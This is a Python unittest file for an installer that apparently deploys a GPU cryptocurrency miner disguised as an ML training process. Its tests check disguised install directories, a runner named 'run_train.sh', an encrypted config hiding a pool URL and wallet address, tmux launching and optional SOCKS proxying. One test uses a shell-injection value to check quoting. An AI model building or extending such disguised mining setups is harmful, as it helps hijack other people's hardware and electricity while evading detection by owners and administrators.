import importlib.util
import json
import os
from pathlib import Path
import subprocess
import tempfile
import unittest
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location("train_setup", ROOT / "train_setup.py")
setup = importlib.util.module_from_spec(spec)
spec.loader.exec_module(setup)

from utils import decrypt_config, encrypt_config


class SetupTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.default_cfg = decrypt_config(json.loads((ROOT / "config.json").read_text()))

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(prefix="gpu-miner-test-")
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.cfg = json.loads(json.dumps(self.default_cfg))
        self.cfg["miner"]["algo"] = "kawpow"
        self.cfg["pool"]["url"] = "stratum+tcp://example.invalid:1234"
        self.cfg["wallet"]["address"] = "wallet with 'quotes'; $(touch SHOULD_NOT_EXIST)"
        self.cfg["disguise"]["app_dir_name"] = str(self.root / "install with 'quotes'")
        self.c = setup.resolve(self.cfg)
        bundle = self.root / "bundle"
        bundle.mkdir()
        (bundle / "pt_main").write_text('#!/usr/bin/env python3\nimport json, os, sys\nprint(json.dumps({"args": sys.argv[1:], "cwd": os.getcwd(), "libs": os.environ["LD_LIBRARY_PATH"], "env": dict(os.environ)}))\n')
        (bundle / "lib").mkdir()
        (bundle / "lib" / "dependency.so").write_text("test library")
        (bundle / "asset.dat").write_text("test asset")
        self.c["source_dir"] = bundle

    def test_install_refreshes_bundle_and_preserves_source(self):
        setup.validate(self.c)
        setup.install(self.c)
        target = self.c["bin_dir"] / self.c["bin_name"]
        self.assertTrue(os.access(target, os.X_OK))
        self.assertTrue((self.c["source_dir"] / "pt_main").is_file())
        self.assertEqual((self.c["bin_dir"] / "lib/dependency.so").read_text(), "test library")
        (self.c["source_dir"] / "asset.dat").write_text("updated")
        setup.install(self.c)
        self.assertEqual((self.c["bin_dir"] / "asset.dat").read_text(), "updated")

    def test_runner_executes_installed_binary_and_quotes_values(self):
        setup.install(self.c)
        for power in (0, 150):
            with self.subTest(power=power):
                self.c["power_limit"] = power
                setup.write_env_file(self.c)
                setup.write_runner(self.c)
                runner = self.c["app_dir"] / "run_train.sh"
                subprocess.run(["bash", "-n", str(runner)], check=True)
                result = subprocess.run([str(runner), "--extra", "two words"], cwd=self.root,
                                        check=True, capture_output=True, text=True)
                output = json.loads(result.stdout)
                args = output["args"]
                self.assertEqual(args[args.index("--user") + 1], self.c["wallet"] + ".gpu01")
                self.assertEqual(args[args.index("--algo") + 1], "kawpow")
                self.assertEqual(args[-2:], ["--extra", "two words"])
                self.assertEqual("--gpu-powerlimit" in args, power != 0)
                if power:
                    self.assertEqual(args[args.index("--gpu-powerlimit") + 1], str(power))
                self.assertEqual(output["cwd"], str(self.c["bin_dir"]))
                self.assertTrue(output["libs"].startswith(str(self.c["bin_dir"])))
                self.assertEqual((self.c["app_dir"] / ".env").stat().st_mode & 0o777, 0o600)
                self.assertFalse((self.c["bin_dir"] / "SHOULD_NOT_EXIST").exists())

    def test_cli_check_and_shell_wrapper_from_other_directory(self):
        config = self.root / "custom.json"
        config.write_text(json.dumps(encrypt_config(self.cfg)))
        for command in (["python3", str(ROOT / "train_setup.py")],
                        ["bash", str(ROOT / "train_setup.sh")]):
            result = subprocess.run(command + ["-c", str(config), "--check"],
                                    cwd=self.root, capture_output=True, text=True)
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertIn(str(ROOT / "src/trainer/pt_main"), result.stdout)
        self.assertFalse(self.c["app_dir"].exists())

    def test_default_encrypted_config_contains_requested_settings(self):
        cfg, check = setup.load_config(["train_setup.py", "--check"])
        self.assertTrue(check)
        self.assertEqual(cfg["miner"]["algo"], "pearlhash")
        self.assertEqual(cfg["pool"]["url"], "stratum+tcp://pool.pearlhash.xyz:9000")
        self.assertEqual(cfg["wallet"]["address"],
                         "prl1p7mmp2mfw997cdau8zr9znra33ax42zsjsy2ras583lt9hwh2wh0sry65al")
        self.assertIs(cfg["useProxy"], False)
        self.assertEqual(cfg["gpu"]["power_limit"], 0)
        setup.validate(setup.resolve(cfg))

    def test_wrong_config_key_fails_before_installing(self):
        encrypted = json.loads((ROOT / "config.json").read_text())
        encrypted["decKey"] = "wrong"
        config = self.root / "wrong-key.json"
        config.write_text(json.dumps(encrypted))
        result = subprocess.run(["python3", str(ROOT / "train_setup.py"), "-c", str(config)],
                                cwd=self.root, capture_output=True, text=True)
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("wrong decKey", result.stderr)
        self.assertNotIn("Traceback", result.stderr)
        self.assertFalse(self.c["app_dir"].exists())

    def test_missing_required_settings_and_bundle_fail(self):
        cfg = json.loads(json.dumps(self.cfg))
        cfg["pool"]["url"] = ""
        cfg["wallet"]["address"] = ""
        cfg["miner"]["algo"] = ""
        with self.assertRaisesRegex(ValueError, "pool_url, wallet, algo"):
            setup.validate(setup.resolve(cfg))
        self.c["source_dir"] = self.root / "missing"
        with self.assertRaisesRegex(ValueError, "Bundled miner missing"):
            setup.validate(self.c)

    def test_tmux_launch_quotes_runner_path(self):
        with patch.object(setup, "sh") as run:
            setup.launch({}, self.c)
        command = run.call_args_list[1].args
        import shlex
        self.assertEqual(shlex.split(command[-1]), [str(self.c["app_dir"] / "run_train.sh")])

    def test_proxy_mode_controls_runner_arguments_and_environment(self):
        setup.install(self.c)
        inherited = {**os.environ, **{key: "stale-proxy" for key in setup.PROXY_ENV_KEYS}}
        # Reuse the install to exercise changing from proxy to direct mode.
        for mode in (True, False, None):
            with self.subTest(useProxy=mode):
                cfg = dict(self.cfg)
                if mode is None:
                    cfg.pop("useProxy", None)
                    cfg.pop("socks", None)
                else:
                    cfg["useProxy"] = mode
                c = setup.resolve(cfg)
                setup.validate(c)
                setup.write_env_file(c)
                setup.write_runner(c)
                result = subprocess.run([str(c["app_dir"] / "run_train.sh")],
                                        env=inherited, check=True, capture_output=True, text=True)
                output = json.loads(result.stdout)
                if mode:
                    self.assertEqual(output["args"].count("--proxy"), 1)
                    self.assertEqual(output["args"][output["args"].index("--proxy") + 1], c["socks"])
                    self.assertEqual(output["env"]["ALL_PROXY"], c["socks"])
                    self.assertEqual(output["env"]["https_proxy"], c["socks"])
                else:
                    self.assertNotIn("--proxy", output["args"])
                    self.assertTrue(set(setup.PROXY_ENV_KEYS).isdisjoint(output["env"]))

    def test_proxy_config_validation(self):
        for invalid in ("true", "false", 1, 0, None, []):
            with self.subTest(invalid=invalid):
                c = {**self.c, "use_proxy": invalid}
                with self.assertRaisesRegex(ValueError, "JSON boolean"):
                    setup.validate(c)
        for socks in (None, "", "http://127.0.0.1:10808"):
            with self.subTest(socks=socks):
                c = {**self.c, "use_proxy": False, "socks": socks}
                setup.validate(c)
                c["use_proxy"] = True
                with self.assertRaisesRegex(ValueError, "socks"):
                    setup.validate(c)

    def test_launch_environment_clears_inherited_proxy(self):
        with patch.dict(os.environ, {key: "stale-proxy" for key in setup.PROXY_ENV_KEYS}):
            self.assertTrue(set(setup.PROXY_ENV_KEYS).isdisjoint(setup.tunnel_env()))
            self.assertEqual(setup.tunnel_env(self.c["socks"])["ALL_PROXY"], self.c["socks"])


if __name__ == "__main__":
    unittest.main()
